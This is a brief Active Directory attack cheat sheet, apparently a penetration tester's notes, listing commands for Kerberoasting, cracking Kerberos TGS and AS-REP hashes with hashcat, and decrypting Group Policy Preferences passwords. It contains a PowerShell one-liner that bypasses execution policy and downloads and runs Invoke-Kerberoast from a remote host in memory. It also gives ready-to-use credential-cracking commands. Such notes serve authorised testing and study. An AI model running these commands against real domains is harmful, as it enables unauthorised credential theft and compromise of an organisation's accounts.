AD

**KERBEROASTING**

Enumerating Accounts in SPN (Service Principal Name):

Powershell Commands when Accessible

~~~PowerShell
setspn -T "DOMAIN\USER" -Q ​ */*
~~~

~~~PowerShell
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.13.7.30/Windows/Powershell/Empire/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
~~~

Decrypt etype23 Hashes from Kerberoasted passwords:

format::
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$A88A8D57DAEBC82CC......

~~~bash
hashcat -m 13100 -​a 0 hash.txt wordlist --force
~~~

Decrypt etype23 Hashes from AS-REP passwords:

format::
$krb5asrep$Admin2@CONTROLLER.local:C669E64E38F0BDC104039C58......

~~~bash
hashcat -m 18200 hash.txt Pass.txt
~~~

**GPP**

https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/

Relies on groups.xml found in sysvol

~~~bash
gpp-decrypt Hash
~~~

Metasploit post module

~~~bash
smb_enum_gpp
~~~

